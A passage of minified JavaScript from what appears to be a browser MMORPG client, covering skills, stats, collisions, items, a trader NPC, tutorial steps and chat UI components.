                const t = this.entity.buffs.incapacitated.size > 0;
                this.skills.forEach((s, i) => {
                    const n = xy.get(i) || xy.set(i, new Map).get(i)
                        , a = new Map;
                    let r = 0;
                    if (t && !s.logic.ignoreIncapacitated ? r = 9 : (r = s.logic.can(this.entity, s.level, this.entity.target, !0),
                        3 !== r && 4 !== r || (r = s.logic.can(this.entity, s.level, this.entity.id, !0))),
                        r !== s.status && (s.status = r,
                            n.get("status") !== r && a.set("status", r)),
                        s.cd.done(e))
                        s.cd.icondone || (s.cd.icondone = !0,
                            void 0 !== n.get("cd") && a.set("cd", void 0),
                            void 0 !== n.get("remaining") && a.set("remaining", void 0));
                    else {
                        s.cd.icondone = !1;
                        const t = Math.round(100 - 100 * s.cd.fraction(e));
                        let i = void 0;
                        s.cd.duration > 1.5 && (i = s.cd.remaining(e),
                            i = i <= 3 ? Math.ceil(10 * i) / 10 : Math.ceil(i)),
                            n.get("cd") !== t && a.set("cd", t),
                            n.get("remaining") !== i && a.set("remaining", i)
                    }
                    a.size > 0 && fe.update(t => (a.forEach((e, i) => {
                        n.set(i, e),
                            t[s.logic.id][i] = e
                    }
                    ),
                        t))
                }
                )
            }
            this.timedSkill && (this.entity.uiFrameDirty = !0,
                this.timedSkill.fx && this.timedSkill.fx.animCast && (!this.entity.transform.currentAnim || this.entity.transform.currentAnim.id !== this.timedSkill.fx.animCast.id) && (this.timedCast.remaining(e) <= (void 0 !== this.timedSkill.fx.animCast.pre ? this.timedSkill.fx.animCast.pre : .5 * this.timedSkill.fx.animCast.dur) || this.timedCast.done(e)) && (this.entity.transform.clearAnims(),
                    this.entity.transform.anim(this.timedSkill.fx.animCast)))
        }
        add(t, e = 0, s = 0, i) {
            if (super.add(t, e, s, i),
                this.isPlayer) {
                this.compileSkillIds(),
                    fe.update(e => (e[t] = {},
                        e));
                const e = this.skills.get(t);
                e.logic.id < 100 && ge.update(t => (t.indexOf(e) < 0 && t.push(e),
                    t))
            }
        }
        remove(t) {
            if (this.isPlayer) {
                this.compileSkillIds(),
                    fe.update(e => (e[t] = void 0,
                        e));
                const e = this.skills.get(t);
                e && ge.update(t => t = t.filter(t => t != e))
            }
            super.remove(t)
        }
        cd(t, e, s) {
            this.skills.get(t).cd.set(e, s)
        }
        clearSkillInfo() {
            ge.update(t => (t.length = 0,
                t))
        }
        startTimedCast(t, e, s, i) {
            this.cleanUpCastingEffect(),
                super.startTimedCast(t, e, s, i),
                this.entity.uiFrameDirty = !0,
                this.entity.transform && (this.timedSkill.fx && this.timedSkill.fx.animTimedCast && (this.entity.transform.anim({
                    id: this.timedSkill.fx.animTimedCast.id,
                    loop: !0,
                    dur: i
                }),
                    this.timedSkill.fx.animTimedCast.effect && this.entity.transform.hands && !this.entity.transform.inFog && this.entity.transform.hands.forEach(t => {
                        const e = td(this.timedSkill.fx.animTimedCast.effect);
                        e.setParent(t),
                            t.data.timedCastEffect = e
                    }
                    )),
                    this.timedSkill.fx && this.timedSkill.fx.animTimedSound && (this.animTimedSound = dl({
                        transform: this.entity.transform,
                        ...this.timedSkill.fx.animTimedSound
                    })))
        }
        interruptTimedCast(t) {
            this.cleanUpCastingEffect(),
                super.interruptTimedCast(t),
                this.entity.uiFrameDirty = !0,
                t && this.entity.transform && this.entity.transform.clearAnims()
        }
        clear() {
            super.clear(),
                this.cleanUpCastingEffect()
        }
        cleanUpCastingEffect() {
            this.timedSkill && (this.entity.transform && this.entity.transform.hands && this.entity.transform.hands.forEach(t => {
                void 0 !== t.data.timedCastEffect && (t.data.timedCastEffect.data.remove = !0),
                    t.data.timedCastEffect = void 0
            }
            ),
                this.animTimedSound && (this.animTimedSound.stop(),
                    this.animTimedSound = void 0))
        }
    }
    class $y {
        constructor(t) {
            this.entity = t,
                this.alive = !0,
                this.stat = new Map,
                this.resource = new Map,
                this.combatTimer = new fh(-1, 6)
        }
        tick(t, e) {
            this.combatTimer.start > 0 && this.combatTimer.done(e) && this.onCombatEnd(e)
        }
        die() {
            return !!this.alive && (this.alive = !1,
                this.entity.skills.onDeath(),
                this.entity.buffs.onDeath(),
                !0)
        }
        getStat(t) {
            return 0 | this.stat.get(t)
        }
        getResource(t) {
            return 0 | this.resource.get(t)
        }
        addStat(t, e) {
            this.stat.set(t, (0 | this.stat.get(t)) + e)
        }
        maxStat(t, e) {
            this.stat.set(t, Math.max(0 | this.stat.get(t), e))
        }
        multiplyStat(t, e) {
            this.stat.set(t, (0 | this.stat.get(t)) * e)
        }
        setResource(t, e) {
            const s = Math.round(nr(e, 0, this.getStat(t)));
            return this.resource.set(t, s),
                s
        }
        changeResource(t, e) {
            return this.setResource(t, this.getResource(t) + e)
        }
        respawn() {
            this.alive = !0
        }
        clear() { }
        refreshCombatTimer(t, e) {
            this.combatTimer.end < t + e && this.combatTimer.reset(t, e)
        }
        onCombatEnd() {
            this.combatTimer.reset(-1)
        }
        getDamageRoll() {
            return Math.round((this.getStat(10) + this.getStat(11)) / 2);
        }
    }
    class Sy extends $y {
        constructor(t) {
            super(t)
        }
        setStat(t, e) {
            this.stat.set(t, e),
                this.entity.uiFrameDirty = !0,
                this.entity.statsDirty = !0,
                20 == t ? this.entity.setFame(e) : 21 == t && this.entity.setElo(e),
                19 == t && this.entity.inventory && this.entity.inventory.setSize(e)
        }
        setResource(t, e) {
            super.setResource(t, e),
                this.entity.uiFrameDirty = !0
        }
        die() {
            super.die(),
                this.entity.uiFrameDirty = !0,
                this.entity.transform && this.entity.transform.onDeath()
        }
        respawn() {
            super.respawn(),
                this.entity.uiFrameDirty = !0,
                this.entity.transform && this.entity.remakeTransform()
        }
        refreshCombatTimer(t, e) {
            super.refreshCombatTimer(t, e),
                this.entity.uiFrameDirty = !0
        }
        onCombatEnd() {
            super.onCombatEnd(),
                this.entity.uiFrameDirty = !0
        }
    }
    const Ey = {}
        , My = (t, e) => !(t[0] > e.r) && (!(t[0] < e.l) && (!(t[2] < e.u) && !(t[2] > e.d)))
        , _y = (t, e) => !(t.l > e.r) && (!(t.r < e.l) && (!(t.d < e.u) && (!(t.u > e.d) && (!(t.b > e.t) && !(t.t < e.b)))))
        , Cy = (t, e, s) => !(s && !_y(t, e)) && Ey[t.type | e.type](t, e);
    Ey[1] = (t, e) => {
        const s = [0, 0, 0]
            , i = t.Za[1] > e.Za[1]
            , n = i ? t.b - e.t : t.t - e.b;
        if (i ? n > 0 : n < 0)
            return s;
        tn(s, e.Za, t.Za);
        let a = s[0] ** 2 + s[2] ** 2;
        const r = t.radius + e.radius;
        if (a < r ** 2) {
            if (a = Math.sqrt(a),
                0 == a || Math.abs(n) < r - a)
                return Vi(s, 0, -n, 0);
            const t = 1 / a * (a - r);
            return s[0] *= t,
                s[1] = 0,
                s[2] *= t,
                s
        }
        return Vi(s, 0, 0, 0)
    }
        ,
        Ey[17] = (t, e) => {
            const s = mn([0, 0, 0], t.Za, -e.rot)
                , i = [0, 0, 0]
                , n = t.Za[1] > e.Za[1]
                , a = n ? t.b - e.t : t.t - e.b;
            if (n ? a > 0 : a < 0)
                return i;
            if (Vi(i, nr(s[0], e.ll, e.lr), 0, nr(s[2], e.lu, e.ld)),
                tn(i, i, s),
                0 == i[0] && 0 == i[2]) {
                const n = tn([0, 0, 0], s, e.local);
                n[0] > 0 ? n[0] = e.lr - s[0] + t.radius : n[0] = e.ll - s[0] - t.radius,
                    n[2] > 0 ? n[2] = e.lu - s[2] + t.radius : n[2] = e.ld - s[2] - t.radius,
                    Math.abs(n[0]) < Math.abs(n[2]) ? i[0] = n[0] : i[2] = n[2]
            } else {
                const e = Math.sqrt(i[0] ** 2 + i[2] ** 2);
                if (e < t.radius) {
                    const s = 1 / e * (e - t.radius);
                    i[0] *= s,
                        i[2] *= s
                } else
                    Vi(i, 0, 0, 0)
            }
            return (0 != i[0] || 0 != i[2]) && (Math.abs(a) < Math.abs(i[0]) || Math.abs(a) < Math.abs(i[2])) ? Vi(i, 0, -a, 0) : i[1] = 0,
                mn(s, i, e.rot),
                s
        }
        ;
    class Ty extends iv {
        constructor(t) {
            t.spawn && "" !== t.spawn.name && (t.name = t.spawn.name),
                super(t),
                this.stats = new Sy(this),
                this.buffs = new Wg(this),
                this.skills = new ky(this),
                this.height = 1.1,
                this.shape = new Vg(this, Ua.bounds, 0, this.Za, .5 * this.size, this.size * this.height),
                Ua.grids.entities.add(this.shape),
                this.steer = [0, 0],
                this.vel = [0, 0, 0],
                this.speed = 1,
                this.static = !1,
                this.jump = !1,
                this.onGround = !0,
                this.onProp = !1,
                this.weight = this.size ** 3,
                this.target = 0,
                this.level = 0,
                this.faction = 0,
                this.yReach = 10,
                this.posLock = [0, 0],
                this.posLockRadius = 0
        }
        tickFixed(t, e, s) {
            super.tickFixed(t, e, s),
                this.buffs.tick(t, e, s),
                this.stats.tick(t, e),
                this.skills.tick(t, e, this),
                this.speed = this.stats.getStat(15) / 20,
                this.buffMovementOverride(t, e, s),
                this.handleEntityCollisions(),
                this.handlePosLock(),
                this.clampWorldPos()
        }
        handlePosLock() {
            if (this.posLockRadius > 0) {
                xa(Va, yr(Ya, this.Za), this.posLock);
                const t = Ea(Va);
                t > this.posLockRadius && this.setXZPos(wa(Va, this.posLock, ka(Va, Va, this.posLockRadius / t)))
            }
        }
        handleEntityCollisions() {
            this.onProp = !1,
                this.stats.alive && !this.static && (this.shape.aabb(),
                    Ua.grids.entities.query(this.shape).forEach(t => {
                        if (t == this.shape || !t.data.stats.alive || this.stationary && t.data.static)
                            return;
                        const e = Cy(this.shape, t, !1);
                        if (0 != e[0] || e[1] != [0] || 0 != e[2]) {
                            let s = t.data.static ? 0 : this.weight / (t.data.weight + this.weight);
                            e[1] > 0 && (s = 0,
                                this.onGround = !0,
                                this.onProp = !0),
                                sn(this.Za, this.Za, e, 1 - s),
                                t.data.static || sn(t.data.Za, t.data.Za, e, -s),
                                on(e, e);
                            const i = ln(this.vel, e)
                                , n = en(Oa, e, i * (1 - s));
                            tn(this.vel, this.vel, n),
                                this.shape.aabb()
                        }
                    }
                    ))
        }
        hasMovementOverride() {
            return this.buffs.movementOverride.size > 0
        }
        buffMovementOverride(t, e, s) {
            this.hasMovementOverride() && this.buffs.movementOverride.forEach(i => {
                i.logic.movementOverride(t, e, s, this, i)
            }
            )
        }
        combatRangeCheck(t, e) {
            const s = this.Za[0] - t.Za[0]
                , i = Math.max(0, Math.abs(this.shape.b - t.shape.b) - this.yReach)
                , n = this.Za[2] - t.Za[2];
            return Math.sqrt(s * s + i * i + n * n) - (t.shape.radius + this.shape.radius + .5) < e
        }
        getWorldYBody(t, e, s) {
            return super.getWorldYBody(t, e, s) + .5 * this.height * this.size
        }
        clampWorldPos() {
            super.clampWorldPos(),
                this.shape.aabb(),
                this.updateShape()
        }
        updateShape() {
            this.shape.update(this.Za, .5 * this.size, this.size * this.height),
                Ua.grids.entities.update(this.shape)
        }
        horizontalSteer(t) {
            if (this.stats.alive) {
                const e = _a(Ya, this.steer);
                this.steer[1] < 0 && (e[1] *= .5),
                    ka(e, e, this.speed * t),
                    pn(this.vel, e, this.rot)
            } else
                this.vel[0] = 0,
                    this.vel[2] = 0
        }
        setSteer(t) {
            t != this.steer && this.stats.alive && ya(this.steer, t)
        }
        setJump(t) {
            t && !this.stats.alive || (this.jump = t)
        }
        setRot(t) {
            this.stats.alive && super.setRot(t)
        }
        setTarget(t) {
            const e = t > 0 && this.canTarget(Ua.getEntityById(t));
            return !1 !== e && void 0 !== e ? e.onTarget(this.id) : this.target !== (this.target = 0)
        }
        onTarget(t) {
            return Ua.getEntityById(t).target = this.id,
                super.onTarget(t)
        }
        getTargetEntity() {
            return Ua.getEntityById(this.target)
        }
        canTarget(t) {
            return t
        }
        setFaction(t) {
            this.faction = t
        }
        setLevel(t) {
            this.level = t
        }
        setClass(t) {
            this.class = t
        }
        onRemove() {
            this.stats.clear(),
                this.buffs.clearTempBuffs(),
                this.buffs.clearPassiveBuffs(),
                this.skills.clear(),
                Ua.grids.entities.remove(this.shape),
                this.shape.onRemove(),
                super.onRemove()
        }
        hostility(t) {
            return (!0 === Ua.mode.partyBasedHostility ? t.party !== this.party : t.faction !== this.faction) ? 0 === t.type ? 2 : 1 : 0
        }
        canCombatInteract(t) {
            return !0
        }
        die(t, e, s) { }
        setPosLock(t, e, s) {
            this.posLock[0] = ~~t,
                this.posLock[1] = ~~e,
                this.posLockRadius = ~~s
        }
    }
    class Py extends Ty {
        constructor(t) {
            super(t),
                this.netPosOffset = [0, 0],
                this.uiFrameDirty = !0,
                this.buffDisplayDirty = !0,
                this.visualPosition = [0, 0, 0],
                this.speechTimer = new fh(0, 5),
                this.mount = void 0,
                this.mountRotAdd = 0,
                this.internalYRot = 0,
                this.netViolations = 0,
                this.namePlateScale = .5
        }
        makeTransform() { }
        remakeTransform(t, e) {
            void 0 !== this.transform && (this.transform.onRemove(),
                this.transform = void 0),
                this.makeTransform(t, e),
                this.updateTransformScale(),
                this.updateTransformRotation(.016)
        }
        onRemove() {
            super.onRemove(),
                void 0 !== this.mount && this.mount.onRemove()
        }
        updateVisualPosition(t, e, s, i = !1) {
            sn(this.visualPosition, this.visualPosition, this.vel, t);
            const n = an(this.Za, this.transform.position);
            (i || n > .001) && (n > 100 ? Yi(this.visualPosition, this.Za) : (tn(Oa, this.Za, this.visualPosition),
                sn(this.visualPosition, this.visualPosition, Oa, Math.min(.5, 30 * t))),
                s.clampV3(this.visualPosition),
                this.onGround && !this.onProp && this.vel[1] < -.001 && (this.visualPosition[1] = this.getWorldYBody(s, this.visualPosition[0], this.visualPosition[2])),
                void 0 === this.mount ? Yi(this.transform.position, this.visualPosition) : (Yi(this.mount.position, this.visualPosition),
                    this.mount.tick(t, e, s),
                    this.mount.mountPosition(this.transform.position)))
        }
        updateTransformScale() {
            Gi(this.transform.scale, .7 * this.size),
                void 0 !== this.mount && Gi(this.mount.scale, .9 * this.size)
        }
        updateTransformRotation(t) {
            if (this.stats.alive) {
                const e = fr(this.rot, ur(this.internalYRot));
                (this.transform.rotationNeedsUpdate || Math.abs(e) > .1) && (this.internalYRot -= .2 * Math.sign(e) * t * 8 + e * t * 5,
                    this.transform.rotation[1] = this.internalYRot,
                    void 0 !== this.mount && this.updateMountRotation(t),
                    this.transform.rotationNeedsUpdate = !0)
            }
        }
        updateMountRotation(t) {
            if (this.onGround && (0 !== this.steer[0] || 0 !== this.steer[1])) {
                let e = 1.5 * this.steer[0];
                this.steer[1] > 0 ? e *= .5 : this.steer[1] < 0 && (e = 0),
                    this.mountRotAdd -= (this.mountRotAdd - e) * t * 10
            }
            this.transform.rotation[1] += this.mountRotAdd,
                this.mount.rotation[1] = this.transform.rotation[1],
                this.mount.rotationNeedsUpdate = !0
        }
        tickFixed(t, e, s) {
            super.tickFixed(t, e, s)
        }
        postFixed(t, e, s) {
            if (super.postFixed(t, e, s),
                this.transform.tickFixed(t, e, s),
                void 0 !== this.mount && this.mount.tickFixed(t, e, s),
                this.onGround && (this.vel[1] = Math.max(0, this.vel[1])),
                this !== s.player && (0 != this.netPosOffset[0] || 0 != this.netPosOffset[1])) {
                const e = ka(Ya, this.netPosOffset, 30 * t);
                this.Za[0] += e[0],
                    this.Za[2] += e[1],
                    xa(this.netPosOffset, this.netPosOffset, e)
            }
        }
        forceNetPosition(t) {
            this.netViolations = 0,
                this.netPosOffset[0] = 0,
                this.netPosOffset[1] = 0,
                this.Za[0] = t[0],
                this.Za[2] = t[1],
                this.onGround && (this.Za[1] = this.getWorldYBody(Ua, this.Za[0], this.Za[2])),
                Yi(this.visualPosition, this.Za)
        }
        parseDelta(t, e, s) {
            switch (t) {
                case Jg.posXZ:
                    {
                        const t = Od(e, 768);
                        this.netPosOffset[0] = t[0] - this.Za[0],
                            this.netPosOffset[1] = t[1] - this.Za[2];
                        const i = Ea(this.netPosOffset);
                        i > (this !== s.player ? .2 * this.speed : this.speed) && (this.netViolations++,
                            (i > 10 || this.netViolations > 3) && this.forceNetPosition(t));
                        break
                    }
                default:
                    super.parseDelta(t, e, s)
            }
        }
        postDelta(t, e, s) {
            super.postDelta(t, e, s),
                this.updateTransformRotation(t),
                this.updateVisualPosition(t, e, s),
                this.transform.tick(t, e, s),
                this.uiFrameDirty && (s.player.target == this.id && this.hydrateUnitStore(ae),
                    this == s.player ? this.hydrateUnitStore(ne) : s.party.has(this.name) && this.hydrateUnitStore(s.party.get(this.name).unitStore)),
                (this.buffDisplayDirty || s.player === this || s.player.target === this.id) && (s.player.target === this.id && this.hydrateBuffStore(re, ji.buffcountUnitframes),
                    this === s.player ? this.hydrateBuffStore(oe, ji.buffcountUnitframes) : (this.buffDisplayDirty || s.player.target === this.id) && s.party.has(this.name) && this.hydrateBuffStore(s.party.get(this.name).buffStore, ji.buffcountParty)),
                void 0 !== this.speechText && this.speechTimer.done(e) && (this.speechText = void 0)
        }
        setTarget(t) {
            const e = this.target
                , s = super.setTarget(t);
            if (e != this.target && this == Ua.player && s) {
                const e = Ua.getEntityById(t);
                e ? (e.hydrateUnitStore(ae, ji.buffcountUnitframes),
                    e.hydrateBuffStore(re, ji.buffcountUnitframes)) : ae.update(t => (t.visible = !1,
                        t))
            }
            return s
        }
        hydrateUnitStore(t) {
            t.update(t => (t.visible = !0,
                t.name = this.name,
                t.alive = this.stats.alive,
                t.hp = this.stats.getResource(6),
                t.hpMax = this.stats.getStat(6),
                t.mp = this.stats.getResource(7),
                t.mpMax = this.stats.getStat(7),
                t.level = this.level,
                t.class = this.class,
                t.id = this.id,
                t.clan = this.clan,
                t.faction = this.faction,
                t.party = this.party,
                t.role = this.partyRole,
                t.type = this.type,
                t.combat = !this.stats.combatTimer.done(Ua.time),
                t.range = !0,
                t.powertype = 2 === this.faction && void 0 !== this.spawn && (this.spawn.meta[4] || !1),
                t.timedSkill = this.skills.timedSkill,
                t.timedCast = this.skills.timedCast,
                t)),
                this.uiFrameDirty = !1
        }
        hydrateBuffStore(t, e) {
            t.update(t => Iy(t, this.buffs, e)),
                this.buffDisplayDirty = !1
        }
        speech(t, e) {
            this.speechText = t,
                this.speechStyle = e,
                this.speechTimer.reset(Ua.time)
        }
    }
    const Iy = (t, e, s) => {
        const i = [];
        e.buffs.forEach(t => {
            t.forEach(t => {
                t.logic.passive || ji.buffsHideIrrelevant && t.caster !== Ua.player.id && (e.entity !== Ua.player || 1 != t.logic.type) || t.logic.diminish && 0 !== i.reduce((e, s) => e + (s.id === t.id ? 1 : 0), 0) || i.push(t)
            }
            )
        }
        );
        const n = i.sort((t, e) => e.time - t.time).sort((t, e) => t.type - e.type).slice(0, s);
        if (t.length < n.length)
            for (; t.length < n.length;)
                t.push(By());
        else if (t.length > n.length)
            for (; t.length > n.length;)
                Ry(t.pop());
        return n.forEach((e, s) => {
            zy(Ua.smoothtime, e, t[s])
        }
        ),
            t
    }
        ;
    let Dy = 0;
    const Ay = []
        , By = () => Ay.pop() || {
            id: Dy++,
            icon: "",
            type: 1,
            time: 0,
            duration: 10,
            stacks: 0
        }
        , Ry = t => {
            Ay.push(t)
        }
        , zy = (t, e, s) => {
            s.icon = `/assets/ui/${e.logic.icon}.${Ro}?v=4002247`,
                s.type = e.logic.type,
                s.time = Math.min(e.timer.duration, e.timer.passed(t)),
                s.duration = e.timer.duration,
                s.stacks = e.diminish > 1 ? e.diminish : e.stacks
        }
        ;
    class Fy extends Py {
        constructor(t) {
            super(t),
                this.static = !0
        }
    }
    class Zy extends Fy {
        constructor(t) {
            super(t),
                this.interactions = t.interactions,
                this.setDialogue(this.interactions[0].text, this.interactions[0].choices),
                this.remakeTransform()
        }
        interact(t) {
            this.createInteraction()
        }
        createInteraction() {
            Gt.set({
                title: this.name,
                text: this.text,
                choices: this.choices
            })
        }
        setDialogue(t, e) {
            this.text = t,
                this.choices = e
        }
    }
    const Uy = t => {
        by.forEach(e => {
            if (!e.engineOnly)
                for (let s = 0; s < e.skilllevels; ++s) {
                    const i = 5 * e.id + s;
                    t["book" + i] = {
                        type: "book",
                        tier: i,
                        level: e.minlevel + 8 * s,
                        skillid: e.id,
                        skilllevel: s,
                        class: e.class,
                        noReward: e.noReward || !1,
                        goldValue: e.goldValue || (e.minlevel + 5 * s < 5 ? 4 : 0),
                        quality: Math.round(Math.min(99, 30 + s / 5 * 70)),
                        art: wp(i, e.class),
                        useSkill: 101,
                        use: (t, s, i, n) => {
                            Ly(t, e.id)
                        }
                    }
                }
        }
        )
    }
        , Ly = (t, e, s) => { }
        , Ny = [{
            id: 0,
            storeValue: 300,
            quality: 90,
            level: 1,
            custom: ["Contains one random mount of rare or epic quality"]
        }]
        , Oy = t => {
            Ny.forEach(e => {
                t["box" + e.id] = {
                    ...e,
                    type: "box",
                    tier: e.id,
                    unsellable: !0,
                    useSkill: 103,
                    use: (t, e, s, i) => { }
                }
            }
            )
        }
        , jy = t => {
            for (const e in tl)
                if (tl[e].tiers) {
                    const s = tl[e];
                    for (let i = 0; i < s.tiers; ++i)
                        Xy({
                            type: e,
                            tier: i,
                            stats: s.stats,
                            level: qy(e, i),
                            class: s.class,
                            quality: s.quality
                        }, t)
                }
        }
        , qy = (t, e) => tl[t].baselvl + Math.floor(e / tl[t].tiers * 100)
        , Xy = (t, e) => {
            const s = {
                level: t.level,
                type: t.type,
                tier: t.tier,
                stats: t.stats ? new Map : void 0,
                class: t.class,
                quality: t.quality
            };
            t.stats && Object.keys(t.stats).sort((t, e) => t - e).forEach(e => {
                const i = t.stats[e];
                s.stats.set(parseInt(e), {
                    min: i.base + t.level * i.min,
                    max: i.base + (t.level + 10) * i.max
                })
            }
            ),
                e[t.type + t.tier] = s
        }
        , Hy = t => {
            const e = [150, 100, 300, 200, 600, 300];
            for (let s = 0; s < 6; ++s) {
                const i = Math.floor(s / 2)
                    , n = s % 2 == 0;
                t["misc" + s] = {
                    type: "misc",
                    tier: s,
                    level: 1 + 20 * i,
                    goldvalue: 5 ** i,
                    quality: 15,
                    custom: [e[s] + (n ? " HP recovered" : " MP recovered")],
                    useSkill: 100,
                    use: (t, e, s, i) => { }
                }
            }
        }
        , Ky = {};
    jy(Ky),
        Hy(Ky),
        Uy(Ky),
        Bg(Ky),
        ay(Ky),
        Oy(Ky);
    const Wy = Object.values(Ky);
    Wy.forEach((t, e) => t.logicId = e);
    const Yy = [];
    for (const t in Ky) {
        const e = Ky[t];
        "book" === e.type && 0 === e.skilllevel ? Yy.push({
            item: e,
            stacks: 1
        }) : "misc" === e.type ? Yy.push({
            item: e,
            stacks: 5
        }) : "box" === e.type ? Yy.push({
            item: e,
            bind: 1,
            rolls: !0,
            maxquality: 0
        }) : "mount" === e.type && e.tier < 2 ? Yy.push({
            item: e,
            rolls: !0,
            maxquality: 0,
            bind: 1
        }) : "charm" === e.type && Yy.push({
            item: e,
            rolls: !0,
            maxquality: 0,
            bind: 2
        })
    }
    class Vy extends Zy {
        constructor(t) {
            super({
                type: 8,
                size: 1.2,
                name: "Trader",
                ...t
            }),
                this.items = Yy
        }
    }
    const Gy = [{
        step: 10,
        fun: () => $l.fwd.down || $l.left.down || $l.right.down
    }, {
        step: 10,
        fun: () => $l.lmb.down || $l.rmb.down,
        click: !0
    }, {
        click: !0
    }, {
        element: "ufplayer",
        click: !0
    }, {}, {
        element: "uftarget",
        click: !0
    }, {
        element: "sk1"
    }, {}, {
        click: !0
    }, {
        element: "expbar",
        click: !0
    }, {}, {
        element: "sysbag",
        step: 100,
        fun: () => ji.inventoryOpen
    }, {
        element: "bag2",
        click: !0
    }, {
        click: !0
    }, {
        element: "syschar",
        step: 100,
        fun: () => ji.charpanelOpen
    }, {
        element: "equipslots",
        click: !0
    }, {
        fixed: () => Ua.player.stats.getStat(22) > 0 ? 100 : Math.round(Ua.player.exp / zp(Ua.player.level) * 100)
    }, {
        element: "syschar",
        step: 100,
        fun: () => ji.charpanelOpen
    }, {
        element: "statpoints"
    }, {
        step: 100,
        fixed: () => Math.round(Ua.player.exp / zp(Ua.player.level) * 100),
        fun: () => Ua.player.level > 3
    }, {
        click: !0
    }, {
        fixed: () => Math.round(Ua.player.inventory.gold / 32 * 100)
    }, {
        fun: () => ji.traderWindow
    }, {
        element: () => "trader" + Yy.findIndex(t => "book" === t.item.type && 3 === t.item.level && t.item.class === Ua.player.class)
    }, {
        element: "bag0",
        click: !0
    }, {
        element: "sysbook",
        step: 100,
        fun: () => ji.skillmenuOpen
    }, {
        element: "skilllist",
        click: !0
    }, {
        element: "skillbar",
        click: !0
    }, {
        click: !0
    }, {
        click: !0
    }, {
        click: !0
    }, {
        click: !0,
        element: "partybtn"
    }, {
        click: !0
    }, {
        click: !0
    }, {
        click: !0
    }, {
        click: !0
    }, {
        click: !0
    }, {
        click: !0
    }, {
        element: "chat"
    }, {
        element: "chatinput"
    }, {
        element: "syscog",
        step: 100,
        click: !0,
        fun: () => ji.settingsOpen
    }, {
        click: !0
    }, {
        step: 100,
        fun: () => !ji.settingsOpen
    }, {
        click: !0
    }, {
        click: !0
    }, {
        gate: () => Ua.player.level >= 25,
        click: !0
    }];
    let Qy = !1;
    const Jy = () => {
        eb.reset(Ua.smoothtime),
            Qy || (Qy = !0,
                Ts.subscribe(t => {
                    const e = Gy[t];
                    e && (void 0 === e.gate || e.gate()) ? $e.set(tb(t)) : $e.set()
                }
                ))
    }
        , tb = t => (dl({
            id: "ui/event1",
            pitch: -1
        }),
        {
            ...Gy[t],
            msg: Xi.ui.tutorial.msg[t],
            GF: 0
        })
        , eb = new fh(0, .2)
        , sb = () => {
            const t = Gy[ji.tutprogress];
            t && eb.done(Ua.smoothtime) && (eb.reset(Ua.smoothtime),
                (void 0 === t.gate || t.gate()) && (t.gate && t.gate() && ib(ji.tutprogress, void 0, 1),
                    t.fun && t.fun() && ib(ji.tutprogress, t.step),
                    t.fixed && ib(ji.tutprogress, void 0, t.fixed())))
        }
        , ib = (t, e, s) => !(!(s || e > 0) || -1 !== t && ji.tutprogress !== t) && ($e.update(i => i ? (i.GF = Math.min(100, s || i.GF + e),
            i.complete = i.GF >= 100,
            i.complete && !i.closing && (i.closing = !0,
                dl({
                    id: "ui/event2",
                    gain: .4,
                    pitch: -1
                }),
                setTimeout(() => {
                    $e.set(),
                        setTimeout(() => {
                            Ts.update(t => (Bp("tutorial", "completestep", t, Math.round(performance.now() / 1e3)),
                                Gy[t + 1] && Gy[t + 1].element && "string" != typeof Gy[t + 1].element && (Gy[t + 1].element = Gy[t + 1].element()),
                                t + 1))
                        }
                            , 100)
                }
                    , 1e3)),
            i) : tb(t)),
            !0);
    var nb = Object.freeze({
        __proto__: null,
        steps: Gy,
        onWorldEnter: Jy,
        postTick: sb,
        tut: ib
    });
    const { Map: ab } = Pt;
    function rb(t, e, s) {
        const i = t.slice();
        return i[27] = e[s],
            i
    }
    function ob(t, e, s) {
        const i = t.slice();
        return i[30] = e[s],
            i
    }
    function lb(t, e, s) {
        const i = t.slice();
        return i[33] = e[s],
            i
    }
    function cb(t) {
        let e, s, i, n;
        const a = [db, hb]
            , r = [];
        function o(t, e) {
            return "whisper" != t[33].channel && void 0 !== t[33].faction ? 0 : 1
        }
        return e = o(t),
            s = r[e] = a[e](t),
        {
            c() {
                s.c(),
                    i = D()
            },
            m(t, s) {
                r[e].m(t, s),
                    M(t, i, s),
                    n = !0
            },
            p(t, n) {
                let l = e;
                e = o(t),
                    e === l ? r[e].p(t, n) : ($t(),
                        Mt(r[l], 1, 1, () => {
                            r[l] = null
                        }
                        ),
                        St(),
                        s = r[e],
                        s || (s = r[e] = a[e](t),
                            s.c()),
                        Et(s, 1),
                        s.m(i.parentNode, i))
            },
            i(t) {
                n || (Et(s),
                    n = !0)
            },
            o(t) {
                Mt(s),
                    n = !1
            },
            d(t) {
                r[e].d(t),
                    t && _(i)
            }
        }
    }
    function hb(t) {
        let e, s, n, a, r = t[33].sender + "";
        return {
            c() {
                e = T("span"),
                    s = P(r),
                    a = I(),
                    B(e, "class", n = "textf" + t[33].faction + " svelte-1vrlsr3")
            },
            m(t, i) {
                M(t, e, i),
                    E(e, s),
                    M(t, a, i)
            },
            p(t, i) {
                64 & i[0] && r !== (r = t[33].sender + "") && F(s, r),
                    64 & i[0] && n !== (n = "textf" + t[33].faction + " svelte-1vrlsr3") && B(e, "class", n)
            },
            i: i,
            o: i,
            d(t) {
                t && _(e),
                    t && _(a)
            }
        }
    }
    function db(t) {
        let e;
        const s = new Ap({
            props: {
                name: t[33].sender,
                pclass: t[33].cclass,
                level: t[33].level,
                faction: t[33].faction,
                sub: t[33].sub
            }
        });
        return {
            c() {
                Ft(s.$$.fragment)
            },
            m(t, i) {
                Zt(s, t, i),
                    e = !0
            },
            p(t, e) {
                const i = {};
                64 & e[0] && (i.name = t[33].sender),
                    64 & e[0] && (i.pclass = t[33].cclass),
                    64 & e[0] && (i.level = t[33].level),
                    64 & e[0] && (i.faction = t[33].faction),
                    64 & e[0] && (i.sub = t[33].sub),
                    s.$set(i)
            },
            i(t) {
                e || (Et(s.$$.fragment, t),
                    e = !0)
            },
            o(t) {
                Mt(s.$$.fragment, t),
                    e = !1
            },
            d(t) {
                Ut(s, t)
            }
        }
    }
    function ub(t) {
        let e, s, i, n = t[33].text + "";
        return {
            c() {
                e = T("span"),
                    s = P(n),
                    B(e, "class", i = "text" + t[33].channel + " svelte-1vrlsr3")
            },
            m(t, i) {
                M(t, e, i),
                    E(e, s)
            },
            p(t, a) {
                64 & a[0] && n !== (n = t[33].text + "") && F(s, n),
                    64 & a[0] && i !== (i = "text" + t[33].channel + " svelte-1vrlsr3") && B(e, "class", i)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function mb(t) {
        let e, s, i = t[33].text + "";
        return {
            c() {
                e = T("span"),
                    B(e, "class", s = "text" + t[33].channel + " svelte-1vrlsr3")
            },
            m(t, s) {
                M(t, e, s),
